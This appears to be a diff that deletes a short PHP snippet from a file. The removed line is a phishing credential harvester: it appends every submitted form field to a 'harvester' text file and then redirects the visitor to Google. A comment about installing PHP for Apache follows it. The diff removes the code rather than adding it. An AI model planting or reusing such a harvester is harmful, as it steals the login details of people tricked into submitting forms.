@@ -1,2 +1,0 @@
-<?php $file = 'harvester_2016-02-24 01:14:10.563322.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://www.google.com" />
-/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */
